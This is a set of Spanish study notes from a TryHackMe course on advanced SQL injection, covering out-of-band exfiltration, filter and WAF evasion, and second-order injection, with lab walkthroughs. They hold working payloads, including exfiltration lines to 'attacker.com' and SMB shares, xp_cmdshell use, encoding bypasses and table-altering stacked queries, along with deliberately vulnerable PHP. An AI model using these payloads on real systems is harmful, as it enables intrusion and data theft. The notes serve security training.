[
  {
    "title": "6. Out-of-band SQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/6-out-of-band-sql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/6. Out-of-band SQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "La inyección SQL out-of-band (OOB) es una técnica de ataque que se usa para exfiltrar información o ejecutar acciones maliciosas cuando los métodos tradicionales resultan poco efectivos. Al contrario que la in-band SQLi, donde se usa el mismo canal para el ataque y la obtención de información, en la OOB SQLi se usan canakes separados para mandar el payload y recibir la respuesta. Las técnicas de OOB SQLi usan funcionaliidades como peticiones HTTP, queries DNS, protocolo SMB u otros protocolos de red a los que el servidor de la base de datos tenga acceso, habilitando a que los atacantes puedan circunvalar firewalls, IDSs y otras medidas de seguridad.\n\n![process flow of OOB injection](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1717060822273)\n\nUna de las ventajas principales es el sigilo y confiabilidad. Usando diferentes canales de comunicación los atacantes minimizan el riesgo de detección y mantienen una conexión persistente. Por ejemplo, el atacante puede inyectar un payload SQL que dispare una petición DNS desde el servidor de la base de datos hasta el servidor de un atacante.\n\n----------------------------------\n<h2>¿Por qué usar OOB?</h2>\nEn escenarios donde la respuesta directa está sanitizada o limitada por medidas de seguridad, OOB habilita que los atacantes puedan exfiltrar información sin feedback inmediato del servidor. Por ejemplo, los mecanismos de seguridad como procedimientos almacenados, encoding de output y restricciones a nivel de aplicación pueden prevenir respuestas directas, haciendo los ataques de inyección SQL tradicionales ineficientes. Las técnicas de OOB como peticiones HHTP o DNS permiten que la información sea mandada circunvalando las medidas de protección.\n\nAdemás, los IDSs y WAFs generalmente monitorizan y registran las respuestas SQL en busca de actividad sospechosa, bloqueando respuestas directas. Usando los dos canales de la OOB, los atacantes pueden evitar este tipo de detección usando protocolos de red menos buscados como DNS o SMB. Particularmente efectivo cuando la conectividad entre el atacante y el servidor es limitada, como si este tiene un firewall o está en otro segmento de red.\n\n------------------------------------\n<h2>Técnicas en Diferentes Bases de Datos</h2>\nLos ataques de inyección SQL OOB utilizan la metodología de escribir en otro canal de comunicación a través de una query construída. Esta técnica es efectiva para exfiltrar información o realizar acciones maliciosas cuando la interacción con la base de datos está restringida. Hay múltiples comandos en la base de datos qque pueden permitir exfiltración pero debajo hay una list de los más usados en varios sistemas de bases de datos.\n\n<h4>MySQL y MariaDB</h4>\nEn MySQL o MariaDB, la inyección SQL OOB puede ser alcanzada usando [SELECT ... INTO OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) o el comando [load_file](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file). Este comando permite a los atacantes escribir los resultados de una query en un archivo en el sistema de archivos. Por ejemplo:\n\n```SQL\nSELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';\n```\n\nUn atacante puede después acceder a este archivo mediante SMB share o un servidor HTTP que corra en el servidor.\n\n<h4>Microsoft SQL Server (MSSQL)</h4>\nEn MSSQL, la inyección SQL OOB puede realizarse usando funcionalidades como [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16), la cual permite la ejecución de comandos de consola directamente de queries SQL. Esto puede ser usado para escribir la información en un archivo accesible a través de una network share:\n\n```sql\nEXEC xp_cmdshell 'bcp \"SELECT sensitive_data FROM users\" queryout \"\\\\10.10.58.187\\logs\\out.txt\" -c -T';\n```\n\nAlternativamente, `OPENROWSET` o `BULK INSERT` pueden ser usados para interactuar con las fuentes de información externas, facilitando la exfiltración a través de canales OOB.\n\n<h4>Oracle</h4>\nEn las bases de datos Oracle, OOB SQLi se ejecuta usando los paquetes [UTL_HTTP](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html) o [UTF_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html). Por ejemplo, el paquete `UTL_HTTP` puede ser usado para mandar peticiones HTTP con información sensible.\n\n```sql\nDECLARE\n  req UTL_HTTP.REQ;\n  resp UTL_HTTP.RESP;\nBEGIN\n  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);\n  UTL_HTTP.GET_RESPONSE(req);\nEND;\n```\n\n------------------------------------------\n<h2>Ejemplos de Técnicas Out-Of-Band SQLi</h2>\nLas técnicas de OOB SQLi en MySQL y MariaDB pueden utilizar varios protocolos de red para exfiltrar datos. Los métodos primarios incluyen exfiltración DNS, peticiones HTTP y shares SMB. Cada una de estas puede ser aplicada dependiendo de las capabilities del entorno MySQL/MariaDB y el setup de red.\n\n<h4>Peticiones HTTP</h4>\nUsando funciones de bases de datos que permiten peticiones HTTP, los atacantes pueden mandar información sensible directamente a un servidor web que controlan. Este método explota las funcionalidades de la base de datos que pueden dirigir hacia fuera las conexiones HTTP. Aunque MySQL y MariaDB no soportan peticiones HTTP de forma nativa puede hacerse mediante scripts externos o UDFs (User Defined Functions) si la base de datos lo permite.\n\nPrimero, la UDF necesita ser creada e instalada para soportar peticiones HTtp. Este setup es complejo y suele involucrar configuración adicional. Una query de ejemplo sería así: `SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;`. La exfiltración mediante peticiones HTTP puede ser implementada en Windows y Linux dependiendo del soporte de la base de datos de scripts externos o UDFs que las permitan.\n\n<h4>Exfiltración DNS</h4>\nLos atacantes pueden usar queries SQL para generar peticiones DNS con información encodeada, la cual se manda a un servidor DNS malicioso. Esta técnica sobrepasa filtros de monitorización basados en HTTP y se aprovecha  de la capacidad de la base de datos para realizar lookups DNS.\n\nComo ya hemos hablado, MySQL no tiene soporte nativo para generar peticiones DNS a través de únicamente comandos SQL. Los atacantes pueden usar otros medios para conseguirlo como UDFs o scripts de sistema para realizar consultas DNS.\n\n<h4>Exfiltración SMB</h4>\nInvolucra escribir los resultados de la query en una share SMB en un servidor externo. Esta técnica es particularmente efectiva en entornos Windows pero también puede configurarse en sistemas Linux con el setup indicado. Un ejemplo de la query se vería así: `SELECT sensitive_data INTO OUTFILE '\\\\\\\\10.10.162.175\\\\logs\\\\out.txt';`.\n\nEsto está completamente soportado ya que Windows soporta nativamente las rutas SMB/UNC. Aunque las rutas SMB son más nativas de Windows, las shares SMB pueden montarse y ser accedidas usando herramientas como `smbclient` o montándolas en un directorio local. Usar directamente rutas UNC en queries SQL puede requerur setup adicional o scripts para facilitar la interacción.\n\n-----------------------------------------\n<h2>Ejemplo Práctico</h2>",
    "modified": "2026-01-08T00:55:08"
  },
  {
    "title": "4. Filter Evasion Techniques",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/4-filter-evasion-techniques/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/4. Filter Evasion Techniques.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "En los ataques de inyección SQL avanzados, evadir filtros es crucial para explotar las vulnerabilidades exitosamente. Las aplicaciones web modernas normalmente implementan medidas defensivas para sanitizar o bloquear patrones de ataque comunes, haciendo los intentos de inyección SQL simple inefectivos. Para esto debemos adaptarnos y llevar a cabo técnicas más sofisticadas. Esta sección cubrirá estos métodos incluyendo encoding de caracteres, inyección SQL sin commillas y cómo manejar escenarios donde no podemos usar espacios.\n\n--------------------------------------\n<h2>Character Encoding</h2>\nInvolucra convertir caracteres especiales en el payload de inyección SQL en formas encodeadas que puedan sobrepasar filtros.\n\n- **URL Encoding:** El encodding URL es un método común donde los caracteres se representan usando un porcentaje seguido de su valor en hexadecimal ASCII. Por ejemplo el payload `'OR 1=1--` puede encodearse como `%27%20OR%201%3D1--`.\n- **Hexadecimal Encoding:** Es otra técnica efectiva para construir queries SQL usando valores hexadecimales. Por ejemplo, la query `SELECT * FROM users WHERE name = 'admin'` puede ser encodeada como `SELECT * FROM users WHERE name = 0x61646d696e`.\n- **Unicode Encoding:** Representa caracteres usando las secuencias de escape Unicode. Por ejemplo, la string `admin` puede ser encodeada como `\\u0061\\u0064\\u006d\\u0069\\u006e`.\n\n<h4>Ejemplo</h4>\nEn este ejemplo exploraremos cómo los desarrolladores pueden implementar filtros para prevenir los ataques de inyección SQL eliminando ciertas palabras clave y caracteres del input del usuario. También veremos cómo los atacantes pueden sobrepasarlos usando técnicas de encodeado.\n\nAquí está el código PHP (`search_books.php`) que maneja la funcionalidad de buscado.\n\n```php\n$book_name = $_GET['book_name'] ?? '';\n$special_chars = array(\"OR\", \"or\", \"AND\", \"and\" , \"UNION\", \"SELECT\");\n$book_name = str_replace($special_chars, '', $book_name);\n$sql = \"SELECT * FROM books WHERE book_name = '$book_name'\";\necho \"<p>Generated SQL Query: $sql</p>\";\n$result = $conn->query($sql) or die(\"Error: \" . $conn->error . \" (Error Code: \" . $conn->errno . \")\");\nif ($result->num_rows > 0) {\n    while ($row = $result->fetch_assoc()) {\n...\n..\n```\n\nEste es el código Javascript en el `index.html` que ofrece la interfaz para la búsqueda de libros.\n\n```javascript\nfunction searchBooks() {\nconst bookName = document.getElementById('book_name').value;\nconst xhr = new XMLHttpRequest();\nxhr.open('GET', 'search_books.php?book_name=' + encodeURIComponent(bookName), true);\n   xhr.onload = function() {\n       if (this.status === 200) {\n           document.getElementById('results').innerHTML = this.responseText;\n```\n\nEn el ejemplo de arriba, el desarrollador ha implementado un mecanismo de defensa básico para prevenir los ataques de inyección SQL eliminando palabras clave específicas como `OR`, `AND`, `UNION` y `SELECT`. El filtro usa la función `str_replace`, la cual extrae estas palabras claves del input del usuario antes de incluirlas en la query SQL. Este acercamiento de filtro busca hacer más difícil a los atacantes inyectar comandos SQL maliciosos, ya que estas palabras claves son esenciales para dichos ataques.\n\n-------------------------------------------\n<h2>Preparing the Payload</h2>\nCaminemos por el proceso de preparar un payload de inyección SQL paso a paso, mostrando cómo el encodeado URL puede sobrepasar defensas básicas. Primero, veamos qué ocurre con un input normal que contiene caracteres especiales o palabras clave SQL. \n\n![[Pasted image 20260103131048.png]]\n\nPero ¿qué pasa si tratamos de añadir `'` o `;`? Obtendremos el siguiente output.\n\n![[Pasted image 20260103131126.png]]\n\nLa query SQL no se está ejecutando correctamente lo que probablemente significa que hay una probabilidad de SQLi. Intentemos inyectar el payload `Intro to PHP' OR 1=1`.\n\n![[Pasted image 20260103131225.png]]\n\nLo que está pasando aquí es que el script PHP está usando la función `str_replace` que extrae la palabra clave `OR` y la comilla simple, resultando en un input sanitizado que no ejecutará la inyección SQL intentada. Este input es inefectivo porque el filtro elimina los componentes críticos necesarios.\n\nPara sobrepasar el filtro necesitamos encodear el input usando encodeade URL, el cual representa caracteres especiales y palabras clave en una forma en la que el filtro no reconoce ni elimina estas. Aquí está el payload de ejemplo `1%27%20||%201=1%20--+`.\n\n- `%27`: URL encoding para `'`.\n- `%20`: URL encoding para el espacio ` `.\n- `||`: Representa el operador `OR` SQL.\n- `%3D`: URL encoding para el signo `=`.\n- `%2D%2D`: URL encoding para `--`, que comienza el comentario en SQL.\n\nEn el payload de arriba `1'` cierra el valor o string actual de la query SQL. Por ejemplo, si la query busca un nombre de libro que coincida con `1`, añadiendo `'` cerramos la string, haciendo al resto del inputparte del statement SQL. La parte `|| 1=1` usa el operador `OR` SQL para añadir una condición que siempre es `true`. Esta condición asegura que la query devuelve true para todos los registros sobrepasando la condición original que supuestamente iba a restringir resultados. De forma similar, `--` comienza un comentario SQL causando que la base de datos ignore el resto de la query. Esto es útil para terminar cualquier parte de la query que pueda causar errores de sintaxis o condiciones no deseadas. Para asegurar un buen spacing, `+` añade un espacio después del comentario, asegurando que el comentario está terminado y que no habrá errores de sintaxis.\n\nDesde la consola podemos ver que hacer click en el botón hace una llamada AJAX a `search_book.php`.\n\n![[Pasted image 20260105121106.png]]\n\nUsaremos el payload directamente en la página PHP para evitar validaciones innecesarias del cliente. Visitaremos la URL `http://IP/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1` con el payload estándar `Intro to PHP' OR 1=1`, y veremos un error.\n\n![[Pasted image 20260105121242.png]]\n\nAhora URLencodeamos el payload `Intro to PHP' || 1=1 --+` usando CyberChef por ejemplo e intentamos acceder a la URL. Obtendremos la siguiente información.\n\n![[Pasted image 20260105122258.png]]\n\nEl payload funciona porque el URL encode representa los caracteres especiales y las palabras clave SQL de una forma que sobrepasa el mecanismo de filtrado. Cuando el servidor decodifica el input URLencodeado, devuelve los caracteres especiales y palabras clave, permitiendo la inyección SQL. Usando URL encoding los atacantes pueden configurar payloads que sobrepasan los filtros básicos sobre el input. Esto demuestra la importancia de usar técnicas de defensa más robustas.",
    "modified": "2026-01-06T00:54:54"
  },
  {
    "title": "5. Filter Evasion Techniques - continued",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/5-filter-evasion-techniques-continued/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/5. Filter Evasion Techniques - continued.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "<h2>No-Quote SQL Injection</h2>\nLas técnicas de inyección SQL sin comilla se usan cuando la aplicación filtra las comillas dobles y simples.\n\n- **Usar Valores Numéricos:** Un acercamiento es usar valores numéricos u otros tipos de datos que no requieran comillas. Por ejemplo, en vez de inyectar `' OR '1'='1`, un atacante podría usar `OR 1=1`. Esta técnica  puede bypassear filtros específicos de comillas.\n- **Usar Comentarios SQL:** Otro método involucra usar comentarios SQL para terminar el resto de la query. Por ejemplo, el input `admin'--` puede transformarse en `admin--`, donde `--` significa el inicio del comentario SQL. Esto puede ayudar a sobrepasar filtros y evitar errores de sintaxis.\n- **Usar la Función CONCAT():** Los atacantes pueden usar funciones SQL como `CONCAT()` para construir strings sin comillas. Por ejemplo `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)` construye la string `admin`. La función `CNCAT()` y métodos similares permiten a los atacantes construir strings sin usar comillas directamente.\n\n---------------------------------------\n<h2>No Spaces Allowed</h2>\nCuando los espacios no están permitidos o están filtradoos, se pueden usar varias técnicas para bypassear esta restricción.\n\n- **Comentar para Reemplazar Espacios:** Un método común es usar comentarios SQL `/**/` para reemplazar a los espaccios. Por ejemplo, en lugar de poner `SELECT * FROM users WHERE name = 'admin'`, un atacante podría poner `SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'`. Los comentarios pueden reemplazar a los espacios en la query.\n- **Tabular o Hacer Nueva Línea:** Otro acercamiento es usar el tabulador `\\t` o la nueva línea `\\n` como sustitutos del espacio. Algunos filtros pueden permitir estos caracteres permitiendo al atacante construir una query como `SELECT\\t*\\tFROM\\tusers\\tWHERE\\tname\\t=\\t'admin'`.\n- **Caracteres Alternos:** Otro método efectivo es usar caracteres URL encodeados representando diferentes tipos de espacio blanco como `%09` (tabulación horizontal), `%0A` (line feed), `%0C` (form feed), `%0D` (carriege return) o `%A0` (non-breaking space). Estos caracteres pueden reemplazar los espacios.\n\n----------------------------------------\n<h2>Ejemplo Práctico</h2>\nEn este escenario tenemos un endpoint, `http://10.82.133.85/space/search_users.php?username=?` que devuelve los detalles del usuario basados en el nombre de usuario proporcionado. El desarrollador ha implementado filtros para bloquear palabras clave de las inyecciones SQL comunes como `OR`, `AND` y espacios (`%20`).\n\nAquí está el filtro PHP añadido por el desarrollador:\n\n```php\n$special_chars = array(\" \", \"AND\", \"and\" ,\"or\", \"OR\" , \"UNION\", \"SELECT\");\n$username = str_replace($special_chars, '', $username);\n$sql = \"SELECT * FROM user WHERE username = '$username'\";\n```\n\nSi usamos nuestro payload estándar `1%27%20||%201=1%20--+`, podemos ver que el URL encoding no está funcionando.\n\n![[Pasted image 20260105131521.png]]\n\nLa query SQL muestra que los espacios son omitidos por el código. Para sobrepasar estas protecciones podemos usar los caracteres URLencodeados que representan diferentes tipos de espacios o cortes de línea como `%09`, `%0A`.\n\nEl payload original `1' OR 1=1 --` puede ser modificado para usar caracteres de nueva línea en vez de espacios, resultando en el payload `1'%0A||%0A1=1%0A--%27+`. Este payload construye la misma condición lógica que `1' OR 1=1 --` pero usa caracteres de nueva línea para sobrepasar el filtro de espacios.\n\nEl parser SQL interpreta los caracteres de línea nueva como espacios, transformando el payload en `1' OR 1=1 --`. Por esto, la query será interpretada de `SELECT * FROM users WHERE username = '$username'` a `SELECT * FROM users WHERE username = '1' OR 1=1 --`.\n\nAhora si accedemos al endpoint a través de un payload actualizado, podemos ver todos los detalles.\n\n![[Pasted image 20260105133144.png]]\n\nPara resumir, es importante entender que no hay una técnica simple que garantice un bypass al lidiar con filtros o Firewalls de Aplicaciones Web (WAFs) diseñados para prevenir los ataque de inyecciones SQL. Sin embargo, aquí hay algunos consejos y trucos que puedes usar para circunvalar estas protecciones. Esta tabla muestra varias técnicas que pueden ser empleadas para sobrepasar filrtos y WAFs.\n\n\n| **Escenario**                                                               | Descripción                                                                                                                | Ejemplo                                                                                                 |\n| --------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |\n| **Palabras clave como SELECT están prohibidas**                             | Las palabras clave SQL pueden ser sobrepasadas cambiando las mayúsculas/minúscular o añadiendo comentarios inline.         | SElEcT * FrOm users or SE/**/LECT * FROM/**/users                                                       |\n| **Los espacios están prohibidos**                                           | Usar caracteres de espacio alternativos o comentarios para reemplazar espacios puede sobrepasar filtros.                   | SELECT%0A*%0AFROM%0Ausers or SELECT/**/*/**/FROM/**/users                                               |\n| **Operadores lógicos como OR o AND están prohibidos**                       | Usar operadores lógicos alternativos o concatenación puede sobrepasar estos filtros.                                       | username = 'admin' && password = 'password' or username = 'admin'/**/\\|/**/1=1 --                       |\n| **Palabras clave comunes como UNION o SELECT están prohibidas**             | Usar representaciones equivalentes como hexadecimal o encodeado Unicode para sobrepasar filtros.                           | SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)                                     |\n| **Palabras clave específicas como OR, AND, SELECT, UNION están prohibidas** | Usar técnicas de ofuscación para disfrazar palabras clave SQL combinando caracteres con funciones de string o comentarios. | SElECT * FROM users WHERE username = CONCAT('a','d','m','i','n') or SElEcT/**/username/**/FROM/**/users |\n\nEn entornos reales, las queries que aplicas y la visibilidad de las palabras clave filtradas no son directamente posibles. Como pentester, es importante entender que la inyección SQL habitualmente incluye un acercamiento de prueba y error requiriendo perseverancia. Cada entorno puede tener filtros y protecciones únicas haciendo necesario adaptarse e intentar diferentes técnicas para encontrar un vector de inyección exitoso.",
    "modified": "2026-01-06T00:54:54"
  },
  {
    "title": "3. Second-Order SQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/3-second-order-sql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/3. Second-Order SQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "La second-order SQLi, también conocida como SQLi stored, explota vulnerabilidades donde el input dado por el usuario es guardado y después usado en una parte diferente de la aplicación, posiblemente tras un procesado inicial. Este tipo de ataque pasa más desapercibido porque el código malicioso SQL no aparece en errores u otros sitios obvios. La inyección ocurre en el segundo uso de los datos, cuando es recuperada y usada en un comando SQL, de ahí el nombre.\n\n![[Pasted image 20251229221729.png]]\n\n---------------------------------------\n<h2>Impacto</h2>\nEl peligro de este tipo de inyección recae en su habilidad de bypassear defensas típicas del front end como validación o sanitización básica, la cual sólo ocurre en el punto inicial de introducción de información. Como no causa errores durante el primer paso, puede ser sebreseído hasta que ya es demasiado tarde, haciéndolo particularmente sigiloso.\n\n<h4>Ejemplo</h4>\nUsaremos una aplicación de reseñas de libros. La aplicación permite a los usuarios añadir nuevos libros vía una página web (`add.php`). A los usuarios se les piden los detalles sobre el libro que desean añadir a la base de datos. La información recolectada incluye `SSN`, `book_name` y `author`. Consideremos añadir un libro con los siguientes detalles: `{SSN:UI00012, book_name:Intro to PHP, author:Tim}`. Esta información se rellena mediante un formulario en la página `add.php`.\n\n![[Pasted image 20251230172642.png]]\n\nComo ya sabemos, la inyección SQL de segundo orden, es notablemente más difícil de identificar. Al contrario que la inyección SQL tradicional, la cual explota en tiempo real las vulnerabilidades, esta ocurre cuando información previamente guardada en la base de datos es usada más adelante  en una query SQL.\n\n<h4>Análisis del Código</h4>\nConsidera el código PHP usado en nuestra aplicación para añadir libros:\n\n```php\nif (isset($_POST['submit'])) {\n\n    $ssn = $conn->real_escape_string($_POST['ssn']);\n\n    $book_name = $conn->real_escape_string($_POST['book_name']);\n\n    $author = $conn->real_escape_string($_POST['author']);\n\n    $sql = \"INSERT INTO books (ssn, book_name, author) VALUES ('$ssn', '$book_name', '$author')\";\n\n    if ($conn->query($sql) === TRUE) {\n\n        echo \"<p class='text-green-500'>New book added successfully</p>\";\n\n    } else {\n\n        echo \"<p class='text-red-500'>Error: \" . $conn->error . \"</p>\";\n\n    }\n\n}\n```\n\nEl código usa el método `real_escape_string()` para escapar caracteres especiales en el input. Aunque este método puede mitigar algunos riesgos de la inyección SQL inmediata, no securiza la aplicación frente a second-order SQLi. El problema clave es la falta de queries parametrizadas lo que es esencial para prevenir ataques de SQLi. Cuando se inserta la información usando este método se pueden incluires caracteres que no causan daño inmediato, pero que de ser metidos en una query secuencial pueden resultar en inyección de segundo orden como `Intro to PHP'; DROP TABLE books;--`.\n\nProbemos a añadir un libro con el SSN `test'`.\n\n![[Pasted image 20251230173850.png]]\n\nEl SSN `test'` fue insertado exitosamente en la base de datos. La aplicación incluye una funcionalidad para actualizar detalles de un libro a través de una interfaz como `update.php`. Esta interfaz puede mostrar detalles de libros existentes en campos de formulario. El pentester investigará si la aplicación reutiliza información como `book_name`. Entonces contruiríamos las queries SQL para actualizar registros usando la información manipulada sin sanitización. Manipulando la funcionalidad de actualización, el tester puede ver si el payload malicioso añadido se ejecuta durante la operación de actualización. Si la aplicación no consigue filtrar estos caracteres o emplear buenas prácticas de seguridad, el payload `'; DROP TABLE books; --` podría activarse llevando a la ejecución de un comando SQL malicioso. \n\n![[Pasted image 20251231132601.png]]\n\nRevisemos ahora el código de `update.php`. Este script permite a los usuarios actualizar detalles de libros en la base de datos de BookStore. A través de la estructura query, analizaremos un escenario típico donde un pentester pueda buscar vulnerabilidades SQLi, especialmente centrándonos en cómo el input se maneja y utiliza en queries SQL.\n\n```php\nif ( isset($_POST['update'])) {\n    $unique_id = $_POST['update'];\n    $ssn = $_POST['ssn_' . $unique_id];\n    $new_book_name = $_POST['new_book_name_' . $unique_id];\n    $new_author = $_POST['new_author_' . $unique_id];\n\n    $update_sql = \"UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');\";\n..\n...\n```\n\nEl script comienza comprobando si el método de petición es POST y si el botón \"Update\" ha sido presionado, indicando que el usuario pretende actualizar los detalles del libro. Siguiendo esto, el script recupera el input del usuario directamente de la información POST.\n\n```php\n$unique_id = $_POST['update'];\n$ssn = $_POST['ssn_' . $unique_id];\n$new_book_name = $_POST['new_book_name_' . $unique_id];\n$new_author = $_POST['new_author_' . $unique_id];\n```\n\nEstas variables son usadas para construir más tarde una query SQL para actualizar los detalles del libro especificado en la base de datos:\n\n```php\n$update_sql = \"UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');\";\n```\n\nEl script usa `multi_query` para ejecutar múltiples queries. \n\n---------------------------------\n<h2>Preparando el Payload</h2>\nSabemos que podemos añadir o modificar los detalles del libro basado en su `ssn`. La query normal para actualizar un libro podría verse así:\n\n```sql\nUPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';\n```\n\nSin embargo, el comando SQL podría ser manipulado si un atacante inserta un valor `ssn` construído por él. Por ejemplo, si el atacante usa el valor `ssn`:\n\n```sql\n12345'; UPDATE books SET book_name = 'Hacked'; --\n```\n\nCuando este valor es usado en la query de actualización, finaliza el comando UPDATE después de `12345` y comienza otro nuevo comando. Esto cambiaría el `book_name` de todas las entradas de la tabla books a **Hacked**.\n\n<h4>Hagamos lo Siguiente</h4>\n1. **Inserción inicial de Payload:** Un nuevo libro es añadido con el payload `12345'; UPDATE books SET book_name = 'Hacked'; --` se inserta en `ssn`. El `;` se usa para terminar el statement SQL actual.\n   \n   ![[Pasted image 20260102124240.png]]\n   \n2. **Ejecución SQL Maliciosa:** Después de eso cuando el admin o cualquier otro usuario visita la URL `update.php`  y lo actualiza, el payload insertado rompe la estructura del comando SQL e inyecta un comando nuevo que actualiza todos los nombres de libros de la tabla books.\n   \n```sql\nUPDATE books SET book_name = 'Testing', author = 'Hacker' WHERE ssn = '12345'; Update books set book_name =\"hacked\"; --'; INSERT INTO logs (page) VALUES ('update.php');\n```\n   \n3. **Comentar el resto:** El doble guión `--`, es un símbolo de comentario de SQL. Cualquier cosa que siga a `--` será ignorado por el servidor SQL, neutralizando efectivamente cualquier resto del statement SQL original que pudiera causar errores o revelar el ataque. Una vez se ejecuta el payload de arriba se cambian todos los nombres como se muestra.\n   \n   ![[Pasted image 20260102125009.png]]",
    "modified": "2026-01-03T00:51:34"
  },
  {
    "title": "2. Quick Recap",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/2-quick-recap/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/2. Quick Recap.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "En la última unidad de SQLi, exploramos los fundamentos de SQLi, entendiendo cómom los atacantes explotan vulnerabilidades en las aplicaciones web para manipular queries SQL y acceder a información no autorizada. Cubrimos técnicas esenciales como la SQLi basada en error o en unión, métodos de blind SQLi como la basada en booleanos o en tiempo. Aquí un repaso rápido de lo que ya sabemos:\n\n![[Pasted image 20251229135548.png]]\n\n----------------------------------------\n<h2>In-band SQL Injection</h2>\nEsta técnica está considerada una de las más comunes y directas de inyección SQL. En esta técnica el atacante usa el mismo canal de comunicación para tanto la inyección y recuperación de información. Hay dos tipos principales de inyección SQL in-band.\n\n- **Error-Based SQL Injection:** El atacante manipula la query SQL para producir mensajes de error de la base de datos. Estos mensajes de error suelen contener información sobre la estructura de la base de datos, lo que puede usarse para explotar la base de datos. Ejemplo: `SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`. Si la versión de la base de datos es devuelta en el mensaje de error, revela información sobre esta.\n- **Union-Based SQL Injection:** El atacante usa el operador SQL UNION para combinar los resultados de dos o más statements SELECT en un solo resultado, recuperando así información de otras tablas. Ejemplo: `SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin`.\n\n--------------------------------------------\n<h2>Inferential (Blind) SQL Injection</h2>\nLa inyección SQL inferencial no transfiere la información directamente a través de la aplicación web, haciendo explotarla más difícil. En su lugar, el atacante manda payloads y observa el comportamiento de la aplicación y tiempos de respuesta para inferir información sobre la base de datos. Hay dos tipos principales de inyección SQL inferencial:\n\n- **Boolean-Based Blind SQL Injection:** El atacante manda una query SQL a la base de datos, forzando la aplicación a que devuelva un resultado diferente basado en una condición true o false. Analizando la respuesta de la aplicación, el atacante puede inferir si el payload era cierto o no. Ejemplo: `SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)`.\n- **Time-Based Blind SQL Injection:** El atacante manda una query SQL a la base de datos que retrasa la respuesta por un periodo de tiempo específico si la condición es cierta. Midiendo el tiempo de respuesta, el atacante puede inferir si la condición es cierta o no. Ejemplo: `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`.\n\n--------------------------\n<h2>Out-of-band SQL Injection</h2>\nOut-of-band SQL Injection es usada cuando el atacante no puede usar el mismo canal para lanzar el ataque y reunir resultados o cuando las respuestas del servidor son inestables. Esta técnica se basa en que el servidor de base de datos haga una petición out-of-band para mandar los resultados de la query al atacante. HTTP es normalmente usado en la inyección SQL out-of-band para mandar el resultado de la query al servidor del atacante.\n\nCada tipo de técnica de inyección SQL tiene sus ventajas y retos.Entender estas técnicas es crucial para identificar y mitigar vulnerabilidades de injección SQL en las aplicaciones web. La inyección SQL in-band, es fácil de explotar y detectar pero ruidosa y fácilmente monitorizable. La inyección SQL inferencial es más difícil de explotar y requiere múltiples peticiones pero puede ser usada cuando los mensajes detallados de error no están disponibles. La inyección SQL out-of-band es menos común y altamente efectiva, requiere un servidor de control externo y se basa en la habilidad de la base de datos de hacer peticiones out-of-band. Controlando estas técnicas, los pentesters pueden identificar eficientemente vulnerabilidades de inyección SQL, ayudando a las organizaciones a securizar sus aplicaciones web contra amenazas.",
    "modified": "2025-12-30T00:53:49"
  }
]